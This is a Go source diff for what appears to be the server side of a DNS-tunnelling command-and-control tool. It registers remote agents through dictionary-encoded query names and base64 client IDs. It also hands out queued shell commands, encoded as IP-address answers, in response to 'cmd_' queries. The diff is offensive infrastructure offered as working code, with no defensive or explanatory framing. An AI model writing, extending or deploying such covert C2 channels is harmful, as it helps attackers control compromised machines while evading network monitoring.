@@ -1,9 +1,16 @@
 package main
 
 import (
+	"bufio"
+	"encoding/base64"
 	"fmt"
+	"os"
 	"strconv"
 	"strings"
+)
+
+var (
+	tmp = map[string]string{}
 )
 
 type server struct {
@@ -54,23 +61,68 @@ func ipdecode(ips []string) string {
 	return strings.Join(chars, "")
 }
 
-func incoming(query string) []string {
+func mnemonicdecode(dict map[string]string, str string) string {
+	// find the key for the value str
+	for key, value := range dict {
+		if value == str {
+			return key
+		}
+	}
+
+	return ""
+}
+
+func getdict() map[string]string {
+	file, err := os.Open("agent/dictionary.txt")
+	if err != nil {
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	dict := map[string]string{}
+	for scanner.Scan() {
+		line := scanner.Text()
+		key := strings.Split(line, ":")[0]
+		value := strings.Split(line, ":")[1]
+		dict[key] = value
+	}
+
+	return dict
+}
+
+func incoming(query string, ip string) []string {
 	query = strings.Split(query, ".")[0]
+	ip = strings.Split(ip, ":")[0]
 	switch query {
 	case "ping":
 		return ipencode("fingerprint")
-	case "cmd":
-		return ipencode("ls")
 	default:
-		if len(query) == 33 {
-			(&serv).clients[strings.Split(query, "mynuts")[1]] = client{strings.Split(query, "mynuts")[1], []string{}, "0.0.0.0"}
+		// fmt.Println(query[:3])
+		if query[:3] == "cmd" {
+			id := strings.Split(query, "_")[1]
+			cmd := serv.clients[id].queue[0]
+			return ipencode(cmd)
 		}
-		return ipencode(fmt.Sprintf("Hello %s, How are you?", query))
+		if mnemonicdecode(getdict(), query) == "don" {
+			parsed := strings.Split(tmp[ip], "mynuts")
+			// base64 decode
+			bin, _ := base64.StdEncoding.DecodeString(parsed[0])
+			dat := string(bin)
+
+			if len(dat) == 32 {
+				serv.clients[parsed[1]] = client{dat, []string{}, ip}
+			}
+			tmp[ip] = ""
+			return ipencode("received don")
+		} else {
+			tmp[ip] += mnemonicdecode(getdict(), query)
+			return ipencode("added")
+		}
 	}
 }
 
 func Serve(port int) server {
-	serv = server{}
+	serv = server{make(map[string]client), port}
 
 	// Start the DNS server
 	go DNS(port, serv)
